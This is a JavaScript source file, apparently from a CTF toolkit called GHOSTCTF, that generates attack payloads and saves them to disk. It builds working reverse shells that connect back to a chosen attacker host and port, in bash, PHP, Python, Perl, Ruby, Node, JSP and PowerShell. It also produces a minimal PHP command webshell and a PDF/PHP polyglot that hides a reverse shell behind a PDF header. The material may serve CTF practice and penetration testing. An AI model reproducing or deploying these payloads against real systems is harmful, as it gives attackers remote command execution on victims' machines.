import path from 'path';
import { mkdir, writeFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/** Raiz do repositório GHOSTCTF (…/GHOSTCTF/payloads). */
export const GHOSTCTF_PAYLOADS_DIR = path.resolve(__dirname, '..', '..', 'payloads');

/** Tipos que não usam LHOST/LPORT. */
export const GHOSTCTF_PAYLOAD_KINDS_NO_LHOST = ['php_webshell_min'];

/** Todos os `kind` aceites por makeGhostctfPayload (documentação / UI). */
export const GHOSTCTF_PAYLOAD_KINDS = [
  'php_reverse_bash',
  'php_webshell_min',
  'sh_reverse_bash',
  'py_reverse_tcp',
  'pl_reverse_tcp',
  'rb_reverse_tcp',
  'js_node_reverse',
  'jsp_reverse_tcp',
  'pdf_php_polyglot_reverse',
  'ps1_reverse_tcp',
];

/**
 * @param {string} kind
 * @returns {boolean}
 */
export function ghostctfPayloadKindNeedsLhost(kind) {
  return !GHOSTCTF_PAYLOAD_KINDS_NO_LHOST.includes(String(kind || '').trim());
}

function validateLhostPort(lhostRaw, lportNum) {
  if (!lhostRaw || !Number.isFinite(lportNum) || lportNum < 1 || lportNum > 65535) {
    return { ok: false, error: 'Este tipo requer lhost e lport (1–65535)' };
  }
  if (lhostRaw.length > 120 || !/^[a-zA-Z0-9.\-]+$/.test(lhostRaw)) {
    return {
      ok: false,
      error: 'lhost: apenas IPv4 ou hostname (A–Z, 0-9, ., -)',
    };
  }
  return { ok: true, lhost: lhostRaw, lport: Math.floor(lportNum) };
}

function safeFileHost(lhostRaw) {
  return lhostRaw.replace(/[^a-z0-9.-]+/gi, '_');
}

/**
 * @param {string} kindIn
 * @param {string} lhostRawIn
 * @param {number} lportNumIn
 * @returns {{ ok: true, body: string, filename: string, lport: number | null } | { ok: false, status: number, error: string }}
 */
export function makeGhostctfPayload(kindIn, lhostRawIn, lportNumIn) {
  const kind = String(kindIn || '').trim();
  const lhostRaw = String(lhostRawIn || '').trim();
  const lportNum = Number(lportNumIn);

  if (!GHOSTCTF_PAYLOAD_KINDS.includes(kind)) {
    return {
      ok: false,
      status: 400,
      error: `kind inválido. Use: ${GHOSTCTF_PAYLOAD_KINDS.join(', ')}`,
    };
  }

  if (kind === 'php_webshell_min') {
    const body =
      "<?php if(isset($_GET['c'])){header('Content-Type: text/plain; charset=utf-8');passthru($_GET['c']);}\n";
    return { ok: true, body, filename: 'cmd.php', lport: null };
  }

  const v = validateLhostPort(lhostRaw, lportNum);
  if (!v.ok) {
    return { ok: false, status: 400, error: v.error };
  }
  const { lhost, lport } = v;
  const h = safeFileHost(lhost);

  if (kind === 'php_reverse_bash') {
    const body = `<?php\nexec("/bin/bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'");\n`;
    return { ok: true, body, filename: `rev_${h}_${lport}.php`, lport };
  }

  if (kind === 'sh_reverse_bash') {
    const body = `#!/bin/bash\nbash -i >& /dev/tcp/${lhost}/${lport} 0>&1\n`;
    return { ok: true, body, filename: `rev_${h}_${lport}.sh`, lport };
  }

  if (kind === 'py_reverse_tcp') {
    const body = `#!/usr/bin/env python3
import socket,subprocess,os
h=${JSON.stringify(lhost)}
p=${lport}
s=socket.socket()
s.connect((h,p))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
`;
    return { ok: true, body, filename: `rev_${h}_${lport}.py`, lport };
  }

  if (kind === 'pl_reverse_tcp') {
    const body = `#!/usr/bin/env perl
use Socket;
$i=${JSON.stringify(lhost)};
$p=${lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))||die;
my $a=inet_aton($i)||((gethostbyname($i))[4]);
$a||die "resolve";
connect(S,sockaddr_in($p,$a))||die;
open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/bash -i");
`;
    return { ok: true, body, filename: `rev_${h}_${lport}.pl`, lport };
  }

  if (kind === 'rb_reverse_tcp') {
    const body = `#!/usr/bin/env ruby
require "socket"
c=TCPSocket.new(${JSON.stringify(lhost)},${lport})
$stdin.reopen(c)
$stdout.reopen(c)
$stderr.reopen(c)
exec("/bin/bash","-i")
`;
    return { ok: true, body, filename: `rev_${h}_${lport}.rb`, lport };
  }

  if (kind === 'js_node_reverse') {
    const body = `require("child_process").exec("bash -c \\"bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\\"");\n`;
    return { ok: true, body, filename: `rev_${h}_${lport}.js`, lport };
  }

  if (kind === 'jsp_reverse_tcp') {
    const body = `<%@ page import="java.io.*" %><%
Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"});
%>`;
    return { ok: true, body, filename: `rev_${h}_${lport}.jsp`, lport };
  }

  if (kind === 'pdf_php_polyglot_reverse') {
    const pdf =
      '%PDF-1.4\n' +
      '1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n' +
      '2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
      '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n' +
      'xref\n0 4\n0000000000 65535 f \n' +
      'trailer<</Size 4/Root 1 0 R>>\n' +
      'startxref\n150\n' +
      '%%EOF\n';
    const php = `<?php\nexec("/bin/bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'");\n`;
    const body = pdf + php;
    return { ok: true, body, filename: `rev_${h}_${lport}.pdf`, lport };
  }

  if (kind === 'ps1_reverse_tcp') {
    const body =
      `$c=New-Object Net.Sockets.TcpClient(${JSON.stringify(lhost)},${lport});` +
      '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
      'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
      '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
      '$r=(iex $d 2>&1|Out-String);' +
      '$w=([text.encoding]::ASCII).GetBytes($r);$s.Write($w,0,$w.Length)}' +
      "\n";
    return { ok: true, body, filename: `rev_${h}_${lport}.ps1`, lport };
  }

  return {
    ok: false,
    status: 400,
    error: `kind inválido. Use: ${GHOSTCTF_PAYLOAD_KINDS.join(', ')}`,
  };
}

/**
 * Grava em GHOSTCTF/payloads/ (cria a pasta se não existir).
 * @param {string} kind
 * @param {string} lhostRaw
 * @param {number} lportNum
 */
export async function saveGhostctfPayloadToProject(kind, lhostRaw, lportNum) {
  const r = makeGhostctfPayload(kind, lhostRaw, lportNum);
  if (!r.ok) return r;
  await mkdir(GHOSTCTF_PAYLOADS_DIR, { recursive: true });
  const full = path.join(GHOSTCTF_PAYLOADS_DIR, r.filename);
  await writeFile(full, r.body, 'utf8');
  return {
    ok: true,
    relativePath: path.join('payloads', r.filename).replace(/\\/g, '/'),
    absolutePath: full,
    filename: r.filename,
    lport: r.lport,
  };
}
